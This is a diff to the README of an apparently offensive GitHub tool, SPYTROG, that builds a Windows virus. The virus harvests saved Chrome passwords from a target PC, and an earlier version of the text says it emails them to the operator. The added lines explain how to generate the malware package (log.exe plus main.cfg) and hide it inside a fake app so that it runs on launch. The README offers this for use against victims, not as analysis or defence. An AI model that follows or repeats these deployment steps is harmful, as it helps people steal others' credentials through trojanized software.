@@ -17,8 +17,10 @@
     <img src="https://img.shields.io/badge/DISCLAIMER-purple?style=for-the-badge;"></img>
     
 #### SPYTROG
-- spytrog is a tool to create windows virus 
-- this virus will retrive all chrome saved password from the target pc and send them to the email you'll entred
+<p align='center'><img src='https://github.com/7AXEL/SPYTROG/blob/main/icon.ico'></p>
+- spytrog tool is used to create windows virus 
+- this virus will retrive all chrome saved password from the target pc
+- to use it just install and run it and select 1 to build virus then enter your email adress and the tool will creat a zip file wish contain the virus log.exe and a config file main.cfg , note that this file is used by the virus then you can build a fake app and include this virus in it by extracting the zip file in the apps file and make your builten app run the virus when she is in execution.
 #### INSTALLATION
 - **`Windows`**
 - > **`1`** download and install git for window from the original git website <a href='https://gitforwindows.org/'>download</a>
